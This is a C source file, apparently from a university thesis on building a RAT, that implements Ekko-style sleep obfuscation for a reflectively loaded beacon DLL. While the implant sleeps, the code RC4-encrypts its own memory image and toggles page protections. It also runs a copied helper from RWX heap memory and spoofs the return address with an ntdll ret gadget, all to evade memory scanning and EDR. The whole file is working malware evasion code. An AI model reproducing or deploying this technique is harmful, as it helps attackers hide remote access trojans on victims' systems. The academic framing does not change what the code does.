/* ============================================================
 * ekko.c — Sleep Obfuscation (Heap-Copy + Stack Spoofing)
 *
 * APPROCCIO: sleep_helper() viene copiata su un buffer RWX in
 * heap ed eseguita da un thread separato.
 *
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 * ============================================================ */

#include <windows.h>
#include <string.h>
#include "ekko.h"

/* ----------------------------------------------------------
 * USTRING / SystemFunction032
 * ---------------------------------------------------------- */
typedef struct {
    ULONG Length;
    ULONG MaximumLength;
    PVOID Buffer;
} USTRING;

typedef NTSTATUS (WINAPI *fnSysFunc032)(USTRING *, USTRING *);

/* ----------------------------------------------------------
 * CET: definizioni per MinGW che non le ha
 * ---------------------------------------------------------- */
#ifndef ProcessUserShadowStackPolicy
# define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)7)
#endif
/* ----------------------------------------------------------
 * CET: enum value per MinGW < 10 che non lo ha
 * ---------------------------------------------------------- */
#ifndef ProcessUserShadowStackPolicy
# define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)7)
#endif

/* ----------------------------------------------------------
 * SLEEP_CTX — passata a sleep_helper (su heap, non nel DLL)
 * ---------------------------------------------------------- */
typedef struct {
    BOOL    (WINAPI *fp_VP   )(LPVOID, SIZE_T, DWORD, PDWORD);
    NTSTATUS(WINAPI *fp_RC4  )(USTRING *, USTRING *);
    VOID    (WINAPI *fp_Sleep)(DWORD);
    BOOL    (WINAPI *fp_SE   )(HANDLE);
    PVOID    dllBase;
    SIZE_T   dllSize;
    USTRING  encData;
    USTRING  encKey;
    BYTE     key[32];
    HANDLE   hDone;
    DWORD    dwMs;
    volatile DWORD decrypted; /* 1 = sleep_helper ha completato decrypt; 0 = incerto */
} SLEEP_CTX;

/* ----------------------------------------------------------
 * sleep_helper — POSITION-INDEPENDENT:
 *   - nessun accesso a variabili global/static del DLL
 *   - tutte le chiamate tramite function pointer in ctx
 *   - nessun string literal
 *
 * Flusso:
 *   1. VP(RW)       → DLL non-eseguibile
 *   2. RC4 encrypt  → DLL cifrato
 *   3. Sleep(dwMs)  → questo thread è in heap, non nel DLL
 *   4. RC4 decrypt  → DLL in chiaro
 *   5. VP(RWX)      → DLL eseguibile
 *   6. SetEvent     → beacon thread si risveglia
 * ---------------------------------------------------------- */
__attribute__((noinline))
static DWORD WINAPI sleep_helper(LPVOID lpParam)
{
    SLEEP_CTX *c = (SLEEP_CTX *)lpParam;
    DWORD old;

    c->fp_VP(c->dllBase, c->dllSize, PAGE_READWRITE, &old);
    c->fp_RC4(&c->encData, &c->encKey);
    c->fp_Sleep(c->dwMs);
    c->fp_RC4(&c->encData, &c->encKey);
    c->fp_VP(c->dllBase, c->dllSize, PAGE_EXECUTE_READWRITE, &old);
    /* Segnala al padre che il decrypt è completato (flag prima di SetEvent) */
    c->decrypted = 1;
    c->fp_SE(c->hDone);
    return 0;
}

/* Sentinella per calcolare la dimensione di sleep_helper */
__attribute__((noinline))
static DWORD WINAPI _sleep_helper_sentinel(LPVOID x)
{
    (void)x;
    return 0;
}

/* ----------------------------------------------------------
 * Helpers interni
 * ---------------------------------------------------------- */
static PVOID _own_base(void)
{
    MEMORY_BASIC_INFORMATION mbi = {0};
    if (!VirtualQuery((PVOID)_own_base, &mbi, sizeof(mbi)))
        return NULL;
    return mbi.AllocationBase;
}

static SIZE_T _own_size(PVOID base)
{
    if (!base) return 0;
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    PIMAGE_NT_HEADERS64 nt =
        (PIMAGE_NT_HEADERS64)((BYTE *)base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    return (SIZE_T)nt->OptionalHeader.SizeOfImage;
}

/* Trova il primo byte 0xC3 (RET) in ntdll — stack spoofing */
static PVOID _find_ret_gadget(void)
{
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return NULL;
    PIMAGE_DOS_HEADER   dos = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS64 nt  =
        (PIMAGE_NT_HEADERS64)((BYTE *)h + dos->e_lfanew);
    BYTE  *img = (BYTE *)h;
    SIZE_T sz  = nt->OptionalHeader.SizeOfImage;
    for (SIZE_T i = 0; i < sz; i++)
        if (img[i] == 0xC3) return img + i;
    return NULL;
}

/* VirtualProtect su tutte le sub-regioni in [base, base+size).
 * Necessario perché il reflective loader crea VAD entries separate
 * per ogni sezione: una singola VP coprirebbe solo la prima. */
static BOOL _vprotect_range(PVOID base, SIZE_T size,
                            DWORD newProt, PDWORD pOldProt)
{
    BYTE *addr  = (BYTE *)base;
    BYTE *end   = addr + size;
    DWORD dummy = 0;
    BOOL  ok    = FALSE;
    if (!pOldProt) pOldProt = &dummy;

    while (addr < end) {
        MEMORY_BASIC_INFORMATION mbi = {0};
        if (!VirtualQuery(addr, &mbi, sizeof(mbi))) break;
        SIZE_T chunk = mbi.RegionSize;
        if ((BYTE *)mbi.BaseAddress + chunk > end)
            chunk = (SIZE_T)(end - (BYTE *)mbi.BaseAddress);
        DWORD prev = 0;
        if (VirtualProtect(mbi.BaseAddress, chunk, newProt, &prev)) {
            *pOldProt = prev;
            ok = TRUE;
        }
        addr = (BYTE *)mbi.BaseAddress + mbi.RegionSize;
    }
    return ok;
}

/* ----------------------------------------------------------
 * ekko_sleep — entry point pubblico
 * ---------------------------------------------------------- */
__attribute__((noinline, optimize("no-omit-frame-pointer")))
void ekko_sleep(DWORD dwMs)
{
    /* ---- Fix 4: CET ---------------------------------------- */
    {
        PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY cet = {0};
        if (GetProcessMitigationPolicy(
                GetCurrentProcess(),
                ProcessUserShadowStackPolicy,
                &cet, sizeof(cet))
            && cet.EnableUserShadowStack)
        {
            goto fallback;
        }
    }

    /* ---- Resolve API --------------------------------------- */
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    if (!hK32 || !hAdv) goto fallback;

    BOOL    (WINAPI *fp_VP   )(LPVOID,SIZE_T,DWORD,PDWORD) =
        (void *)GetProcAddress(hK32, "VirtualProtect");
    NTSTATUS(WINAPI *fp_RC4  )(USTRING*,USTRING*) =
        (void *)GetProcAddress(hAdv, "SystemFunction032");
    VOID    (WINAPI *fp_Sleep)(DWORD) =
        (void *)GetProcAddress(hK32, "Sleep");
    BOOL    (WINAPI *fp_SE   )(HANDLE) =
        (void *)GetProcAddress(hK32, "SetEvent");
    HANDLE  (WINAPI *fp_CT   )(LPSECURITY_ATTRIBUTES,SIZE_T,
                               LPTHREAD_START_ROUTINE,LPVOID,
                               DWORD,LPDWORD) =
        (void *)GetProcAddress(hK32, "CreateThread");
    DWORD   (WINAPI *fp_WFSO )(HANDLE,DWORD) =
        (void *)GetProcAddress(hK32, "WaitForSingleObject");
    HANDLE  (WINAPI *fp_CE   )(LPSECURITY_ATTRIBUTES,BOOL,BOOL,LPCWSTR) =
        (void *)GetProcAddress(hK32, "CreateEventW");
    BOOL    (WINAPI *fp_CH   )(HANDLE) =
        (void *)GetProcAddress(hK32, "CloseHandle");
    LPVOID  (WINAPI *fp_VA   )(LPVOID,SIZE_T,DWORD,DWORD) =
        (void *)GetProcAddress(hK32, "VirtualAlloc");
    BOOL    (WINAPI *fp_VF   )(LPVOID,SIZE_T,DWORD) =
        (void *)GetProcAddress(hK32, "VirtualFree");

    if (!fp_VP || !fp_RC4 || !fp_Sleep || !fp_SE ||
        !fp_CT || !fp_WFSO || !fp_CE || !fp_CH ||
        !fp_VA || !fp_VF)
        goto fallback;

    /* ---- Base / Size del DLL corrente ---------------------- */
    PVOID  dllBase = _own_base();
    SIZE_T dllSize = _own_size(dllBase);
    if (!dllBase || !dllSize) goto fallback;

    /* ---- Fix 5: pre-normalizzazione a RWX ------------------ */
    {
        DWORD _p = 0;
        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READWRITE, &_p);
    }

    /* ---- Dimensione di sleep_helper (con sanity check) ----- */
    SIZE_T helper_size =
        (SIZE_T)((BYTE *)_sleep_helper_sentinel - (BYTE *)sleep_helper);
    if (helper_size == 0 || helper_size > 4096)
        helper_size = 512;

    /* ---- Copia sleep_helper su heap RWX ------------------- */
    PVOID helper_copy = fp_VA(NULL, helper_size + 64,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (!helper_copy) goto fallback;
    memcpy(helper_copy, (PVOID)sleep_helper, helper_size);

    /* ---- Alloca SLEEP_CTX su heap ------------------------- */
    SLEEP_CTX *ctx = (SLEEP_CTX *)fp_VA(NULL, sizeof(SLEEP_CTX),
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_READWRITE);
    if (!ctx) {
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Genera chiave RC4 a 32 byte (xorshift64) --------- */
    {
        ULONG64 s = (ULONG64)dllBase
                    ^ ((ULONG64)dwMs << 16)
                    ^ 0xDEADBEEFCAFEBABEULL;
        for (int i = 0; i < 32; i++) {
            s ^= (s >> 12);
            s ^= (s << 25);
            s ^= (s >> 27);
            ctx->key[i] = (BYTE)(s & 0xFF);
        }
    }

    /* ---- Popola SLEEP_CTX --------------------------------- */
    ctx->fp_VP    = fp_VP;
    ctx->fp_RC4   = fp_RC4;
    ctx->fp_Sleep = fp_Sleep;
    ctx->fp_SE    = fp_SE;

    ctx->dllBase  = dllBase;
    ctx->dllSize  = dllSize;

    ctx->encData.Buffer        = dllBase;
    ctx->encData.Length        = (ULONG)dllSize;
    ctx->encData.MaximumLength = (ULONG)dllSize;

    ctx->encKey.Buffer         = ctx->key;
    ctx->encKey.Length         = 32;
    ctx->encKey.MaximumLength  = 32;

    ctx->dwMs      = dwMs;
    ctx->decrypted = 0;   /* sleep_helper setta a 1 dopo il decrypt */

    ctx->hDone = fp_CE(NULL, FALSE, FALSE, NULL);
    if (!ctx->hDone) {
        fp_VF(ctx, 0, MEM_RELEASE);
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Stack spoofing ----------------------------------- */
    PVOID pRetGadget = _find_ret_gadget();
    void *ret_slot_addr = NULL;
    __asm__ volatile ("lea 8(%%rbp), %0" : "=r"(ret_slot_addr));
    void **ret_slot = (void **)ret_slot_addr;
    void  *orig_ret = *ret_slot;
    if (pRetGadget)
        *ret_slot = pRetGadget;

    /* ---- Lancia sleep_helper dal heap --------------------- */
    HANDLE hThread = fp_CT(NULL, 0,
                           (LPTHREAD_START_ROUTINE)helper_copy,
                           ctx, 0, NULL);
    if (!hThread) {
        if (pRetGadget) *ret_slot = orig_ret;
        fp_CH(ctx->hDone);
        fp_VF(ctx, 0, MEM_RELEASE);
        fp_VF(helper_copy, 0, MEM_RELEASE);
        goto fallback;
    }

    /* ---- Attendi fine sleep (timeout = dwMs + 10 s) ------- */
    DWORD wr = fp_WFSO(ctx->hDone, dwMs + 10000);

    /* ---- Ripristina return address PRIMA di qualsiasi ret -- */
    if (pRetGadget)
        *ret_slot = orig_ret;

    if (wr != WAIT_OBJECT_0 && ctx->decrypted == 0) {
        /* Timeout reale: sleep_helper non ha ancora decifrato il DLL.
         * Forziamo RW per scrivere, decifriamo, poi ripristiniamo RWX. */
        DWORD _rp0 = 0;
        _vprotect_range(dllBase, dllSize, PAGE_READWRITE, &_rp0);
        USTRING ed = { (ULONG)dllSize, (ULONG)dllSize, dllBase };
        USTRING ek = { 32, 32, ctx->key };
        fp_RC4(&ed, &ek);
    }

    /* ---- Fix 8: ripristina RWX su TUTTE le regioni dopo sleep ----------
     * sleep_helper usa una singola VirtualProtect che potrebbe coprire
     * solo la prima VAD entry. _vprotect_range itera su tutte le regioni.
     * Applicato sempre (sia WAIT_OBJECT_0 che timeout). */
    {
        DWORD _rp = 0;
        _vprotect_range(dllBase, dllSize, PAGE_EXECUTE_READWRITE, &_rp);
    }

    /* ---- Cleanup ------------------------------------------ */
    fp_WFSO(hThread, 3000);
    fp_CH(hThread);
    fp_CH(ctx->hDone);
    fp_VF(ctx,         0, MEM_RELEASE);
    fp_VF(helper_copy, 0, MEM_RELEASE);
    return;

fallback:
    Sleep(dwMs);
}
